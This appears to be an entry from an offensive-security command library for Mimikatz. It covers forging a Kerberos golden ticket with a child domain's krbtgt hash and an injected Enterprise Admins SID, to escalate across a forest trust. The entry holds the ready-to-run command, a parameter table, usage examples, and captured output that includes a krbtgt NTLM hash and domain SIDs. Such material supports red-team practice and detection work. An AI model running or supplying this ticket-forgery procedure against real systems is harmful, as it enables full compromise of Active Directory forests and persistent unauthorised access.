---
id: c598292d-2332-4b56-ae72-c2de84fdb7dc
name: mimikatz-forge-internal-ad-forest-trust-ticket
type: command
executor: command_prompt
data: >-
  mimikatz.exe "kerberos::golden /domain:$_CHILD_DOMAIN /sid:$_CHILD_DOMAIN_SID
  /sids:$_ENTERPRISE_ADMIN_SID /user:Administrator /krbtgt:$_KRBTGT_NTLM /ptt"
  "exit"
output: >-
  C:\Windows\System32\spool\drivers\color>mimikatz.exe "kerberos::golden
  /domain:dev.tesla.local /sid:S-1-5-21-1576920733-1301476157-954876328
  /sids:S-1-5-21-3428605742-3005092657-1212549955-519  /user:Administrator
  /krbtgt:832f0dd83dca633442171fde86a478cf /ptt" "exit"

    .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
   .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
   ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
   ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
   '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
    '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

  mimikatz(commandline) # kerberos::golden /domain:dev.tesla.local
  /sid:S-1-5-21-1576920733-1301476157-954876328
  /sids:S-1-5-21-3428605742-3005092657-1212549955-519  /user:Administrator
  /krbtgt:832f0dd83dca633442171fde86a478cf /ptt

  User      : Administrator

  Domain    : dev.tesla.local (DEV)

  SID       : S-1-5-21-1576920733-1301476157-954876328

  User Id   : 500

  Groups Id : *513 512 520 518 519

  Extra SIDs: S-1-5-21-3428605742-3005092657-1212549955-519 ;

  ServiceKey: 832f0dd83dca633442171fde86a478cf - rc4_hmac_nt

  Lifetime  : 7/20/2020 3:05:04 PM ; 7/18/2030 3:05:04 PM ; 7/18/2030 3:05:04 PM

  -> Ticket : ** Pass The Ticket **

   * PAC generated
   * PAC signed
   * EncTicketPart generated
   * EncTicketPart encrypted
   * KrbCred generated

  Golden ticket for 'Administrator @ dev.tesla.local' successfully submitted for
  current session


  mimikatz(commandline) # exit

  Bye!
created_at: '2020-07-20T22:27:56.255542+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - kerberos
  - ticket-forgery
verified: true
validated: true
---

# mimikatz-forge-internal-ad-forest-trust-ticket

## Command

```command_prompt
mimikatz.exe "kerberos::golden /domain:$_CHILD_DOMAIN /sid:$_CHILD_DOMAIN_SID /sids:$_ENTERPRISE_ADMIN_SID /user:Administrator /krbtgt:$_KRBTGT_NTLM /ptt" "exit"
```

## Description

This command uses Mimikatz to forge a Kerberos golden ticket for an internal forest trust scenario. It crafts a ticket using the child domain's krbtgt hash and injects an extra SID from a parent domain privileged group, allowing privilege escalation across domains when SID filtering is disabled.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_CHILD_DOMAIN | FQDN of the child domain (e.g., dev.tesla.local) | Yes |
| $_CHILD_DOMAIN_SID | SID of the child domain (e.g., S-1-5-21-1576920733-1301476157-954876328) | Yes |
| $_ENTERPRISE_ADMIN_SID | SID of the parent domain's Enterprise Admins group | Yes |
| $_KRBTGT_NTLM | NTLM hash of the child domain's krbtgt account (32 hex chars) | Yes |
| /ptt | Pass-the-ticket: Injects the forged ticket into the current session | Yes |
| /user:Administrator | Specifies the user for the ticket (default admin user) | Yes |

## Examples

### Basic Usage

```command_prompt
mimikatz.exe "kerberos::golden /domain:child.example.com /sid:S-1-5-21-xxx /sids:S-1-5-21-yyy-519 /user:Administrator /krbtgt:abcdef123456 /ptt" "exit"
```

### Advanced Usage

For multiple extra SIDs, chain them with spaces: /sids:SID1 SID2.

## Expected Output

Description of what output to expect when the command runs successfully.

```
User      : Administrator
Domain    : dev.tesla.local (DEV)
SID       : S-1-5-21-1576920733-1301476157-954876328
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-3428605742-3005092657-1212549955-519 ;
ServiceKey: 832f0dd83dca633442171fde86a478cf - rc4_hmac_nt
Lifetime  : [dates]
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ dev.tesla.local' successfully submitted for current session
```

## Related

- [[procedures/Forge-Internal-Forest-Trust-Ticket-and-Escalate-to-Parent-DA-via-SIDHistory]]
- [[commands/psexec-spawn-powershell-prompt-as-system]]
